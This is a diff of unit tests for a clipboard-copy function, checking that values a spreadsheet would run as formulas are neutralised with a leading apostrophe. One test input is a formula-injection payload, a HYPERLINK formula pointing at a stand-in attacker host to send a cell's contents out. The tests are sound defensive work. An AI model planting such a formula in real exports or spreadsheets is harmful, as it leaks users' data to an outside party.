@@ -16,6 +16,29 @@ describe("clipboardField", () => {
   });
 });
 
+describe("clipboardField formula guard", () => {
+  // A range is copied FOR a spreadsheet, and a spreadsheet evaluates a pasted `=...` the way it
+  // evaluates one in an opened CSV: the same X1 guard as the CSV export (`src/lib/export/csv.ts`).
+  test("prefixes a value a spreadsheet would run as a formula with an apostrophe", () => {
+    expect(clipboardField('=HYPERLINK("http://attacker/"&A1)')).toBe('"\'=HYPERLINK(""http://attacker/""&A1)"');
+    expect(clipboardField("=1+1")).toBe("'=1+1");
+    expect(clipboardField("+1+1")).toBe("'+1+1");
+    expect(clipboardField("-1+1")).toBe("'-1+1");
+    expect(clipboardField("@SUM(A1)")).toBe("'@SUM(A1)");
+  });
+
+  test("a lead that hides behind a tab or a carriage return is caught, and still quoted", () => {
+    expect(clipboardField("\t=1+1")).toBe('"\'\t=1+1"');
+    expect(clipboardField("\r=1+1")).toBe('"\'\r=1+1"');
+  });
+
+  test("a plain number keeps its sign and needs no apostrophe", () => {
+    expect(clipboardField("-12.5")).toBe("-12.5");
+    expect(clipboardField("+3")).toBe("+3");
+    expect(clipboardField("-1e5")).toBe("-1e5");
+  });
+});
+
 describe("selectionClipboardText", () => {
   test("a single cell copies its value raw, with no quoting, so it pastes into an editor as typed", () => {
     expect(selectionClipboardText([{ rows: [["line 1\nline 2"]] }])).toBe("line 1\nline 2");
@@ -61,6 +84,12 @@ describe("selectionClipboardText", () => {
 
   test("two single cells are two rows, each a quoted field", () => {
     expect(selectionClipboardText([{ rows: [["a\tb"]] }, { rows: [["c"]] }])).toBe('"a\tb"\nc');
+  });
+
+  test("a range and its headers are guarded; a lone cell is the value as it is", () => {
+    expect(selectionClipboardText([{ headers: ["=h"], rows: [["=1+1", "x"]] }])).toBe("'=h\n'=1+1\tx");
+    // One cell is copied for an editor or a search box, as Copy Cell always has: raw.
+    expect(selectionClipboardText([{ rows: [["=1+1"]] }])).toBe("=1+1");
   });
 
   test("nothing selected copies nothing", () => {
